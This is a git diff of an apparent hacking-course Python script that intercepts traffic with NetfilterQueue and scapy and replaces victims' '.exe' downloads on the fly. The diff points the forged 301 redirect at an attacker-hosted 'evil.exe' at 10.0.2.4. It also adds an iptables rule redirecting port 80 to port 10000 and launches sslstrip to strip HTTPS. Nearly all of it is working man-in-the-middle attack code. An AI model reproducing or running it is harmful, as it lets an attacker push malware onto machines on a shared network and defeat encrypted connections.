@@ -4,19 +4,15 @@ from netfilterqueue import NetfilterQueue as net
 import scapy.all as scapy
 from subprocess import call, Popen
 
+
 ack_list = []
 
 
-def delete_pkt(scapy_pkt):
+def set_load(scapy_pkt, new_load):
+    scapy_pkt[scapy.Raw].load = new_load
     del scapy_pkt[scapy.IP].len
     del scapy_pkt[scapy.IP].chksum
     del scapy_pkt[scapy.TCP].chksum
-    return scapy_pkt
-
-
-def set_load(scapy_pkt, new_load):
-    scapy_pkt[
-        scapy.Raw].load = new_load
     return scapy_pkt
 
 
@@ -27,20 +23,23 @@ def process_packet(pkt):
     if scapy_pkt.haslayer(scapy.Raw):
         # dport - destination port (request)
         # if in the TCP layer n dport it set to 80 (http)
-        if scapy_pkt[scapy.TCP].dport == 80:
+        print(scapy_pkt[scapy.TCP].dport)
+        print(scapy_pkt[scapy.TCP].sport)
+        print("__________")
+        if scapy_pkt[scapy.TCP].dport == 10000:
             # if the user download something it will have .exe in the load
-            if ".exe" in scapy_pkt[scapy.Raw].load:
+            if ".exe" in scapy_pkt[scapy.Raw].load and "10.0.2.4" not in scapy_pkt[scapy.Raw].load:
                 print(".exe request")
                 ack_list.append(scapy_pkt[scapy.TCP].ack)
 
         # sport - source port (response)
-        elif scapy_pkt[scapy.TCP].sport == 80:
+        elif scapy_pkt[scapy.TCP].sport == 10000:
+            print("hey4")
             if scapy_pkt[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_pkt[scapy.TCP].seq)
-                print("[+] Replacing file")
+                print("[+] Replacing file__________")
                 modified_pkt = set_load(scapy_pkt,
-                         "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-590he.exe\n\n")
-                modified_pkt = delete_pkt(scapy_pkt)
+                                        "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.4/evilfiles/evil.exe\n\n")
                 pkt.set_payload(str(modified_pkt))
 
     pkt.accept()
@@ -67,6 +66,8 @@ queue = net()
 queue.bind(1, process_packet)
 try:
     call(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
+    call(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
+    Popen(['xterm', '-e', 'sudo sslstrip -l 10000'])
     answer = input_validation()
     print(answer)
     if answer in ["y", "Y"]:
